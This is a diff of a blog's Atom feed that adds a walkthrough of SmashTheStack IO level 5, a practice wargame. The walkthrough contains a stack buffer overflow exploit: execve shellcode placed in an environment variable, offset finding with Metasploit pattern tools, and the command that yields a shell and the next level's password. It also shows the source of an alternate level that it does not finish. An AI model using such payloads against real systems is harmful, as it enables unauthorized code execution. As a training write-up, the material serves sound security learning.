@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-07-19T01:10:06+03:00</updated>
+  <updated>2014-07-19T19:39:40+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,273 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
+    <updated>2014-07-18T20:08:18+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
+    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>
+
+<!-- more -->
+
+
+<p>Code for level05.c:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>
+
+<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* Get env var location. */</span>
+</span><span class='line'>        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> <span class="cm">/* Adjust for program name. */</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run the program in GDB with the pattern and then get the offset:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x37654136 in ?? ()
+</span><span class='line'>
+</span><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
+</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now get the address of our environment variable:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
+</span><span class='line'>PWN will be at 0xbfffff53</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Profit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
+</span><span class='line'>sh-4.2$ whoami
+</span><span class='line'>level6
+</span><span class='line'>sh-4.2$ cat /home/level6/.pass
+</span><span class='line'>9BT8fmYDTPimXXhY3m</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//don&#39;t get trapped, there&#39;s no need</span>
+</span><span class='line'><span class="c1">//level by bla</span>
+</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define LOADERSIZE (232 + 16)</span>
+</span><span class='line'><span class="kt">void</span><span class="o">*</span> <span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
+</span><span class='line'><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">newstack</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">code</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">env</span><span class="p">[])</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">newcode</span><span class="p">,</span> <span class="o">*</span><span class="n">newstack</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c1">//allocate memory at random addresses</span>
+</span><span class='line'>  <span class="n">newstack</span> <span class="o">=</span> <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">);</span>
+</span><span class='line'>  <span class="n">newcode</span> <span class="o">=</span>  <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xcd</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xe8</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;</span><span class="se">\x0F\x34</span><span class="s">&quot;</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xdb</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="c1">//prepare new code section, leaving some space for a loader</span>
+</span><span class='line'>      <span class="n">strncpy</span><span class="p">(</span><span class="n">newcode</span> <span class="o">+</span> <span class="n">LOADERSIZE</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1000</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>      <span class="c1">//start executing using a new stack and code section.</span>
+</span><span class='line'>      <span class="n">switchcontext</span><span class="p">(</span><span class="n">newstack</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">newcode</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
+</span><span class='line'><span class="cm">/* HALT! The code below only provides a controllable aslr/noexec for this challenge, there&#39;s no need to waste time on it */</span>
+</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
+</span><span class='line'><span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="n">initializePRNG</span><span class="p">(){</span><span class="kt">int</span> <span class="n">seed</span><span class="p">;</span><span class="kt">FILE</span><span class="o">*</span><span class="n">devrand</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/random&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">devrand</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">devrand</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span><span class="n">fclose</span><span class="p">(</span><span class="n">devrand</span><span class="p">);</span><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);}</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">loader</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mh">0xe899c031</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span><span class="kt">void</span><span class="o">*</span>
+</span><span class='line'><span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">){</span><span class="kt">int</span> <span class="n">tries</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">hint</span><span class="p">,</span><span class="n">res</span><span class="p">;</span><span class="k">while</span><span class="p">(</span><span class="n">tries</span><span class="o">--</span><span class="p">){</span><span class="n">hint</span><span class="o">=</span><span class="n">rand</span><span class="p">()</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">;</span><span class="n">res</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">hint</span><span class="p">,</span><span class="n">size</span>
+</span><span class='line'><span class="o">+</span><span class="mi">4096</span><span class="p">,</span><span class="n">flags</span><span class="p">,</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">hint</span><span class="o">==</span><span class="n">res</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="o">++</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">hint</span><span class="p">;</span><span class="k">return</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">res</span><span class="o">+</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xffc</span><span class="p">));}</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">res</span><span class="p">,</span><span class="n">size</span><span class="o">+</span><span class="mi">4096</span><span class="p">))</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="n">newstack</span><span class="p">,</span><span class="kt">char</span><span class="o">*</span><span class="n">code</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&lt;&lt;=</span><span class="mi">2</span><span class="p">;</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span>
+</span><span class='line'><span class="p">,</span><span class="n">loader</span><span class="p">,</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xf3\xab\x31\xff</span><span class="s">&quot;</span><span class="p">,</span><span class="n">LOADERSIZE</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span><span class="n">asm</span><span class="p">(</span><span class="s">&quot;mov %0, %%esp</span><span class="se">\n</span><span class="s">mov %1,%%eax</span><span class="se">\n</span><span class="s">jmp *%%eax&quot;</span><span class="o">::</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">newstack</span><span class="o">-</span><span class="mi">4</span><span class="p">),</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">:</span><span class="s">&quot;eax&quot;</span><span class="p">);}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Function overview</h4>
+
+<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>
+
+<p>PROT_EXEC  Pages may be executed.</p>
+
+<p>PROT_READ  Pages may be read.</p>
+
+<p>PROT_WRITE Pages may be written.</p>
+
+<p><strong>strchr</strong></p>
+
+<p><em>char <em>strchr(const char </em>str, int ch);</em></p>
+
+<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>
+
+<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>
+
+<p>I will come back to this at a later time.</p>
+
+<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kali tools catalog - Information Gathering]]></title>
